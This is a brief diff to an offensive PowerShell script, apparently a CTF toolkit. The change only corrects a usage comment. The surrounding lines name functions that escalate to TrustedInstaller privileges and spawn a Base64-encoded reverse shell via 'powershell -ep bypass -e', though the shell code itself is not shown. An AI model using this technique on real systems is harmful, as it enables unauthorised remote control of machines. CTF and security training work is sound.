@@ -18,7 +18,7 @@ function Invoke-TrustedInstaller {
 }
 
 # Spawns a Base64 reverse shell with TI privileges using 'powershell -ep bypass -e'
-# Usage: Invoke-TIRevShellTLS -IP <IP> -Port <Port>
+# Usage: Invoke-TIRevShell -IP <IP> -Port <Port>
 # Can be used offline, so more suitable for CTF environments
 
 function Invoke-TIRevShell {
